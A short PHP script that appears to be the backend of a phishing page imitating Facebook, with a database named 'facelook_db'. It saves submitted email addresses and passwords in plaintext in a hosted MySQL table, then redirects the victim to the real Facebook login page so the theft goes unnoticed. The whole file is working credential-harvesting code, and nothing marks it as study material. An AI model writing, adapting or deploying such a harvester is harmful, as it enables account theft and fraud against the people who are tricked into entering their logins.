
<?php
// Database connection details
$servername = "sql303.infinityfree.com";
$username = "if0_37747211";
$password = "";
$dbname = "if0_37747211_facelook_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST["email"];
    $password = $_POST["password"];


    // Prepare and execute the SQL statement
    $sql = "INSERT INTO users (email, password) VALUES (?, ?)";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $email, $password);


    if ($stmt->execute()) {
        header("Location: https://www.facebook.com/login");
        exit(); 
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $stmt->close();
}

// Close connection
$conn->close();
?>

